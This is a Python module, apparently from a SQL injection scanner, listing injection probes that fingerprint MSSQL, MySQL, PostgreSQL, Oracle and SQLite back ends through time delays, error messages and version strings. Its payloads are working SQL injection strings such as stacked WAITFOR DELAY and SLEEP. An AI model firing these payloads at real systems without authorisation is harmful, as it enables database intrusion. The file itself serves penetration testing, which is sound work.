# -*- coding: utf-8 -*-
"""
Smart Database Fingerprinting Engine.

This module provides a list of behavioral probes to identify the backend
database technology by observing its responses to various inputs.
"""
import re

# Behavioral probes for different database systems
# 'type' can be 'time', 'content', or 'error'
# Payloads are crafted to be injected into a string parameter (e.g., in a WHERE clause).
# The 'validator' for 'content' is the expected string in the response.
# The 'validator' for 'time' is the expected delay in seconds.
BEHAVIORAL_PROBES = [
    # --- Microsoft SQL Server ---
    # High-confidence time-based check. Adding a semicolon to break out of stacked queries.
    {"db": "MSSQL", "type": "time", "payload": "';WAITFOR DELAY '0:0:2'--", "validator": 2},
    # Specific error message from a failed conversion. Very reliable.
    {"db": "MSSQL", "type": "error", "payload": "' AND 1=CONVERT(int, 'sqlihunter')--", "validator": re.compile(r"conversion failed when converting the varchar value 'sqlihunter' to data type int", re.IGNORECASE)},

    # --- MySQL ---
    # High-confidence time-based check.
    {"db": "MySQL", "type": "time", "payload": "' AND SLEEP(2)--", "validator": 2},
    # Specific error for a syntax that is valid in other DBs but not MySQL.
    {"db": "MySQL", "type": "error", "payload": "' AND 1=2-'-'", "validator": re.compile(r"bigint unsigned value is out of range", re.IGNORECASE)},
    # Content-based check for version string. High confidence.
    {"db": "MySQL", "type": "content", "payload": "' AND 1 IN (SELECT @@version)--", "validator": re.compile(r"\d+\.\d+\.\d+", re.IGNORECASE)},

    # --- PostgreSQL ---
    # High-confidence time-based check.
    {"db": "PostgreSQL", "type": "time", "payload": "' AND pg_sleep(2)--", "validator": 2},
    # Specific error from a failed cast. Very reliable.
    {"db": "PostgreSQL", "type": "error", "payload": "' AND 1=CAST('sqlihunter' AS int)--", "validator": re.compile(r"invalid input syntax for type integer", re.IGNORECASE)},
    # Content-based check for version string. High confidence.
    {"db": "PostgreSQL", "type": "content", "payload": "' AND 1 IN (SELECT version())--", "validator": re.compile(r"postgresql \d+\.\d+", re.IGNORECASE)},

    # --- Oracle ---
    # Time-based check using a PL/SQL block. High confidence.
    {"db": "Oracle", "type": "time", "payload": "' AND DBMS_LOCK.SLEEP(2)--", "validator": 2},
    # Specific error for a known PL/SQL issue.
    {"db": "Oracle", "type": "error", "payload": "' AND 1=UTL_INADDR.GET_HOST_NAME('1.2.3.4')--", "validator": re.compile(r"ora-29257", re.IGNORECASE)},

    # --- SQLite ---
    # Content-based check for a SQLite-specific function, now with a proper validator.
    {"db": "SQLite", "type": "content", "payload": "' AND 1 IN (SELECT sqlite_version())--", "validator": re.compile(r"\d+\.\d+\.\d+", re.IGNORECASE)},
    # Specific error from a function that doesn't exist in other DBs.
    {"db": "SQLite", "type": "error", "payload": "' AND 1=zeroblob(1000000000)--", "validator": re.compile(r"too many bytes in a zeroblob", re.IGNORECASE)},
]
